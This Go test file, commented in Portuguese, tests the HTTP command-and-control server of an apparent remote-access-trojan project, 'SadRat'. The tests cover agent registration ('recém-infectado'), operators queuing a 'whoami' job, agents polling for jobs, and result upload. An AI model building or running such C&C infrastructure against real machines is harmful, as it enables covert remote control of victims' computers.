package tests

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"strings"
	"fmt"

	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/VitorDie/SadRat/internal/presentation"
	"github.com/VitorDie/SadRat/internal/repository"
)

func TestServerHTTP_GiveAnUUIDForAgentRequest(t *testing.T) {
	// 1. Especificação: Instanciamos o cofre e injetamos no Servidor HTTP
	repo := repository.NewServerDBPlainDataInMemory()
	server := presentation.NewServerHTTP(repo)

	// 2. Ação: Simulamos um Agente recém-infectado chamando o C&C via rede
	req, err := http.NewRequest(http.MethodPost, "/api/agents", nil)
	if err != nil {
		t.Fatalf("Erro ao criar a requisição: %v", err)
	}

	// O Recorder atua como se fosse o "navegador/cliente" para capturar a resposta
	rr := httptest.NewRecorder()
	
	// A função Router() deve devolver o roteador que contém as URLs mapeadas
	server.Router().ServeHTTP(rr, req)

	// 3. Validação de Rota e Status HTTP
	if status := rr.Code; status != http.StatusCreated { // Esperamos HTTP 201 (Created)
		t.Errorf("Esperava status %v, recebeu %v", http.StatusCreated, status)
	}

	// 4. Validação do DTO de Resposta (Encoding responses)
	var response map[string]string
	err = json.NewDecoder(rr.Body).Decode(&response)
	if err != nil {
		t.Fatalf("Erro ao decodificar JSON da API: %v", err)
	}

	if response["uuid"] == "" {
		t.Error("A API deveria ter gerado e devolvido um UUID em JSON, mas veio vazio")
	}
}

func TestServerHTTP_ReceiveCommand(t *testing.T) {
	// 1. Especificação: Instanciamos o cofre e o Servidor
	repo := repository.NewServerDBPlainDataInMemory()
	server := presentation.NewServerHTTP(repo)

	// Precisamos de um Agente salvo no banco para o Operador poder mandar comando pra ele
	targetAgentID := "agent-123"
	repo.SaveAgent(domain.NewAgentRow(targetAgentID))

	// 2. Ação: Simulamos o Operador (Client) enviando um DTO em JSON pela rede
	payload := `{"agent_id": "agent-123", "command": "whoami", "args": []}`
	req, err := http.NewRequest(http.MethodPost, "/api/jobs", strings.NewReader(payload))
	if err != nil {
		t.Fatalf("Erro ao criar a requisição: %v", err)
	}
	req.Header.Set("Content-Type", "application/json") // A API exige JSON

	rr := httptest.NewRecorder()
	
	// O Roteador recebe a requisição HTTP e deve encaminhar para a função correta
	server.Router().ServeHTTP(rr, req)

	// 3. Validação de Rota e Status
	if status := rr.Code; status != http.StatusCreated && status != http.StatusOK {
		t.Errorf("Esperava status 200 (OK) ou 201 (Created), recebeu %v", status)
	}

	// 4. Validação da Resposta: A API deve devolver o JSON do Job com o ID gerado pelo domínio
	var response map[string]interface{}
	err = json.NewDecoder(rr.Body).Decode(&response)
	if err != nil {
		t.Fatalf("Erro ao decodificar JSON da resposta do C&C: %v", err)
	}

	if response["id"] == nil || response["id"] == "" {
		t.Error("A API deveria ter retornado o 'id' do Job gerado, mas veio vazio")
	}

	if response["command"] != "whoami" {
		t.Errorf("Esperava que a API confirmasse o comando 'whoami', mas retornou '%v'", response["command"])
	}
}

func TestServerHTTP_SendJobs(t *testing.T) {
	// 1. Especificação: Instanciamos o cofre e o Servidor
	repo := repository.NewServerDBPlainDataInMemory()
	server := presentation.NewServerHTTP(repo)

	// Simulamos que um Agente existe no banco
	agentID := "agent-123"
	repo.SaveAgent(domain.NewAgentRow(agentID))

	// Simulamos que o Operador JÁ ENVIOU um comando para esse agente
	job := domain.NewJobRow(agentID, "whoami", []string{})
	repo.SaveJob(job)

	// 2. Ação: O Agente faz a requisição GET para buscar comandos (Long Polling)
	// Note o uso da URL com o ID do agente embutido
	url := "/api/agents/" + agentID + "/job"
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		t.Fatalf("Erro ao criar a requisição: %v", err)
	}

	rr := httptest.NewRecorder()
	
	// O Roteador recebe a requisição HTTP e deve processar
	server.Router().ServeHTTP(rr, req)

	// 3. Validação de Rota e Status
	if status := rr.Code; status != http.StatusOK {
		t.Errorf("Esperava status 200 (OK), recebeu %v", status)
	}

	// 4. Validação da Resposta: A API deve devolver o JSON do Job salvo no banco
	var response map[string]interface{}
	err = json.NewDecoder(rr.Body).Decode(&response)
	if err != nil {
		t.Fatalf("Erro ao decodificar JSON da resposta do C&C: %v", err)
	}

	if response["command"] != "whoami" {
		t.Errorf("Esperava o comando 'whoami', mas retornou '%v'", response["command"])
	}
}

func TestServerHTTP_ReceiveJobResult(t *testing.T) {
	// 1. Especificação: Instanciamos o cofre e o Servidor
	repo := repository.NewServerDBPlainDataInMemory()
	server := presentation.NewServerHTTP(repo)

	// Simulamos o estado inicial do banco de dados (Agente existe e Comando existe)
	agentID := "agent-123"
	repo.SaveAgent(domain.NewAgentRow(agentID))
	
	job := domain.NewJobRow(agentID, "whoami", []string{})
	repo.SaveJob(job) // Salvamos o Job pendente (Output e ExecutedAt estão nulos)

	// 2. Ação: O Agente executou o comando e envia o DTO UpdateJobResult via POST
	payload := fmt.Sprintf(`{"job_id": "%s", "output": "vitordie\n"}`, job.ID)
	req, err := http.NewRequest(http.MethodPost, "/api/jobs/result", strings.NewReader(payload))
	if err != nil {
		t.Fatalf("Erro ao criar a requisição: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	rr := httptest.NewRecorder()
	server.Router().ServeHTTP(rr, req) // Aciona a rota da API

	// 3. Validação de Rota e Status (A API aceitou?)
	if status := rr.Code; status != http.StatusOK {
		t.Errorf("Esperava status 200 (OK), recebeu %v", status)
	}

	// 4. Validação de Regra de Negócio (O Banco de Dados foi atualizado de verdade?)
	updatedJob, err := repo.GetJob(job.ID)
	if err != nil {
		t.Fatalf("Erro ao buscar job atualizado: %v", err)
	}

	if updatedJob.Output == nil || *updatedJob.Output != "vitordie\n" {
		t.Errorf("Esperava que o Output fosse salvo como 'vitordie\\n', mas veio %v", updatedJob.Output)
	}

	if updatedJob.ExecutedAt == nil {
		t.Error("Esperava que a data de ExecutedAt tivesse sido preenchida com o horário atual, mas continua nula")
	}
}
